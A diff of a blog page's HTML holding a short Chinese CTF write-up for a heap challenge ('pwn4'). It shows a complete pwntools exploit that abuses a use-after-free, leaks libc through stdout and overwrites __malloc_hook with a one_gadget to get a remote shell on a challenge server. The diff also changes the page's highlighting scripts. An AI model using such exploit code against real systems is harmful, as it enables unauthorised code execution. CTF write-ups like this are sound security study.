@@ -81,6 +81,11 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
 
     
 
@@ -483,8 +488,73 @@
     
         <p>存在 uaf，通过改 stdout 来 leak libc，最后改 malloc_hook 为 one_gadget 来get shell。</p>
 <p>(顺便吐槽一下不给 libc 的zz操作</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn4')</span></span><br><span class="line">p = remote(<span class="string">'101.200.53.148'</span>,<span class="number">15423</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span><span class="params">(size,con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(<span class="string">'80'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'______?'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'start_the_game,yes_or_no?'</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fr</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'index ?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chan</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'index ?'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'__new_content ?'</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'0'</span>)</span><br><span class="line">ad(<span class="number">0x80</span>,<span class="string">'1'</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'2'</span>)</span><br><span class="line">ad(<span class="number">0x10</span>,<span class="string">'defense'</span>)</span><br><span class="line"></span><br><span class="line">fr(<span class="number">1</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'4'</span>)</span><br><span class="line">fr(<span class="number">0</span>)</span><br><span class="line">fr(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">chan(<span class="number">2</span>,<span class="string">'\x70'</span>)</span><br><span class="line">chan(<span class="number">4</span>,<span class="string">'\xdd\x25'</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'5'</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'6'</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'7'</span>)  <span class="comment">#stdout2233</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span></span><br><span class="line">chan(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">p.recvuntil(<span class="string">'\x7f'</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]<span class="number">-131</span></span><br><span class="line">p.info(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'free: '</span>+hex(libc_base+libc.sym[<span class="string">'free'</span>]))</span><br><span class="line">p.info(<span class="string">'system: '</span>+hex(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">fr(<span class="number">1</span>)</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">chan(<span class="number">1</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'8'</span>)</span><br><span class="line">ad(<span class="number">0x68</span>,<span class="string">'9'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x13</span>)+p64(libc_base+<span class="number">0xf1207</span>)</span><br><span class="line">chan(<span class="number">9</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">'80'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'______?'</span>,str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import *
 
+#context.log_level = &#39;debug&#39;
+
+#p = process(&#39;./pwn4&#39;)
+p = remote(&#39;101.200.53.148&#39;,15423)
+elf = ELF(&#39;./pwn4&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,checksec = False)
+
+def ad(size,con):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,str(1))
+    p.sendline(&#39;80&#39;)
+    p.sendlineafter(&#39;______?&#39;,str(size))
+    p.sendafter(&#39;start_the_game,yes_or_no?&#39;,con)
+
+
+def fr(idx):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,str(2))
+    p.sendlineafter(&#39;index ?&#39;,str(idx))
+
+def chan(idx,con):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,str(4))
+    p.sendlineafter(&#39;index ?&#39;,str(idx))
+    p.sendafter(&#39;__new_content ?&#39;,con)
+
+
+ad(0x68,&#39;0&#39;)
+ad(0x80,&#39;1&#39;)
+ad(0x68,&#39;2&#39;)
+ad(0x10,&#39;defense&#39;)
+
+fr(1)
+ad(0x68,&#39;4&#39;)
+fr(0)
+fr(2)
+
+chan(2,&#39;\x70&#39;)
+chan(4,&#39;\xdd\x25&#39;)
+ad(0x68,&#39;5&#39;)
+ad(0x68,&#39;6&#39;)
+ad(0x68,&#39;7&#39;)  #stdout2233
+payload = &#39;a&#39;*0x33+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;
+chan(7,payload)
+
+p.recvuntil(p64(0xfbad1800))
+p.recvuntil(&#39;\x7f&#39;)
+libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:]+&#39;\x00\x00&#39;)-libc.sym[&#39;_IO_2_1_stdout_&#39;]-131
+p.info(&#39;libc_base: &#39;+hex(libc_base))
+
+p.info(&#39;free: &#39;+hex(libc_base+libc.sym[&#39;free&#39;]))
+p.info(&#39;system: &#39;+hex(libc_base+libc.sym[&#39;system&#39;]))
+
+fr(1)
+realloc = libc_base + libc.sym[&#39;realloc&#39;]
+malloc_hook = libc_base+libc.sym[&#39;__malloc_hook&#39;]
+chan(1,p64(malloc_hook-0x23))
+ad(0x68,&#39;8&#39;)
+ad(0x68,&#39;9&#39;)
+payload = &#39;a&#39;*(0x13)+p64(libc_base+0xf1207)
+chan(9,payload)
+
+p.sendlineafter(&#39;&gt;&gt; &#39;,str(1))
+p.sendline(&#39;80&#39;)
+p.sendlineafter(&#39;______?&#39;,str(0x10))
+
+#gdb.attach(p)
+p.interactive()</code></pre>
 
         
     
@@ -839,6 +909,12 @@ It will not impact the appearance and can give developers a lot of support :)
 
 <!-- Import prettify js  -->
 
+    
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
+
 
 
 <!-- Window Load -->
@@ -849,6 +925,13 @@ It will not impact the appearance and can give developers a lot of support :)
         $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
     });
 
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
     
     
 </script>
